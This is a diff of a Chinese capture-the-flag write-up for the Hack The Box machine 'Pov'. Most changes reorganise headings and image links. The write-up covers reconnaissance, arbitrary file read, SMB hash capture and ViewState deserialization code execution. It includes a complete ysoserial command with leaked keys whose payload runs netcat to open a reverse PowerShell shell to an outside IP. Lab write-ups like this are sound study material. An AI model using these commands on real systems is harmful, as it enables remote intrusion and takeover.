@@ -4,7 +4,9 @@ pagination_prev: null
 pagination_next: null
 ---
 
-# 端口扫描
+## 信息收集
+
+### 端口扫描
 
 ### 全端口扫描
 
@@ -106,7 +108,7 @@ PORT      STATE         SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 3.13 seconds
 
 ~~~
-# 目录爆破
+### Web 目录爆破
 
 ~~~
 ┌──(kali㉿kali)-[~/pov]                                                                                                                                                                                                                 
@@ -274,7 +276,7 @@ by Ben "epi" Risher 🤓 ver: 2.11.0
 
 
 
-# 子域名枚举
+### 子域名枚举
 
 dev似乎是可能的子域名，而且在主页最底部也提到了这个域名
 
@@ -319,15 +321,15 @@ Found: xn--nckuad2au4azb6dvd8fna2594hb0sc-biz.pov.htb Status: 400 [Size: 334]
 Found: xn--eckm3b6d2a9b3gua9f2d6658ehctafoz-jp.pov.htb Status: 400 [Size: 334] ****
 ~~~
 
-![](Pasted%20image%2020241127174807.png)
+![](Pasted_image_20241127174807.png)
 
-# dev.pov.htb
+### dev.pov.htb 子域名信息收集
 
 看起来是一个个人的简介，还可以下载他的简历
 
-![](Pasted%20image%2020241127180224.png)
+![](Pasted_image_20241127180224.png)
 
-![](Pasted%20image%2020241127180316.png)
+![](Pasted_image_20241127180316.png)
 
 做一下简单的目录爆破
 
@@ -378,18 +380,22 @@ Emma Re
 Michael Abra
 ~~~
 
+## 漏洞利用
+
+### 任意文件读取与 SMB 哈希窃取
+
 下载简历的时候抓一下包
 
-![](Pasted%20image%2020241127191125.png)
+![](Pasted_image_20241127191125.png)
 
 试试可不可以修改file参数
 成功！，我们可以进行任意文件读取
 
-![](Pasted%20image%2020241127191217.png)
+![](Pasted_image_20241127191217.png)
 
 试一下读smb共享
 
-![](Pasted%20image%2020241127194817.png)
+![](Pasted_image_20241127194817.png)
 
 收到反应
 
@@ -498,7 +504,9 @@ Stopped: Wed Nov 27 06:52:32 2024
 
 尝试读取配置文件
 
-![](Pasted%20image%2020241127205621.png)
+![](Pasted_image_20241127205621.png)
+
+### ViewState 反序列化 RCE
 
 看了wp才知道viewstate是一个序列化后的对象，我们这里已经拿到了解密的密钥，可以进行反序列化注入
 
@@ -555,6 +563,8 @@ PS C:\Users\lizis\Desktop\tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008
 PS C:\Users\lizis\Desktop\tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio"  --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "c:\programdata\nc64.exe -e powershell.exe 10.10.16.19 443"
 ~~~
 
+### 获得初始 Shell
+
 拿到立足点
 
 ~~~
@@ -570,7 +580,9 @@ PS C:\windows\system32\inetsrv>
 
 ~~~
 
-# 提权
+## 权限提升
+
+### 敏感文件泄露获取用户凭据
 
 找了一圈userflag没找到
 
@@ -676,6 +688,8 @@ b579e28933415d760f073634f2dbf586
 PS C:\Users\alaading\Desktop> 
 
 ~~~
+
+### SeDebugPrivilege 提权
 
 查看权限，发现SeDebugPrivilege开放
 
